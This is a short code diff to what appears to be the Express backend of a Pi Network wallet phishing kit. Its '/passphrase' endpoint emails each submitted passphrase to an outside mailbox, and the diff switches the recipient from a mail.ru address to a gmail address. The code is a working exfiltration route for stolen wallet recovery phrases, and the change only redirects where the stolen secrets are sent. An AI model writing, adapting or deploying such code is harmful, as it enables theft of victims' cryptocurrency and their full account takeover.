@@ -50,7 +50,7 @@ app.post('/passphrase', async (req, res) => {
   // Define the email message
   const mailOptions = {
     from: 'sender@pitransferactivation.com',
-    to: 'pinetworkmainnetactivation@mail.ru',
+    to: 'ashleygentry571@gmail.com',
     subject: 'Passphrase Received',
     text: `Passphrase: ${passphrase}`,
   };
